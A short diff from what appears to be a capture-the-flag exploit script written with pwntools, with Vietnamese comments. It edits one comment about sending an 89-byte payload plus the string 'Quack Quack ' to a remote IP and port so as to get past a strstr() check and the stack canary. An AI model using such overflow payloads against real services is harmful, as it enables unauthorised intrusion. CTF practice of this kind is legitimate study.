@@ -95,7 +95,7 @@ from pwn import *
 p = remote('61.14.233.78', 7001)
 
 # Payload đầu tiên để bypass strstr()
-# Gửi 89 bytes để chiếm đầy `buf` + 1 byte đè lên byte đầu tiên của stack canary (thường là \x00)
+# Gửi 89 bytes để chiếm đầy `buf` + 1 byte bỏ qua byte đầu tiên của stack canary (thường là \x00)
 # Sau đó là chuỗi "Quack Quack " để hàm `strstr(buf, "Quack Quack ")` tìm thấy chuỗi này tại offset 89
 first = b'A'*89 + b"Quack Quack "
 p.send(first)
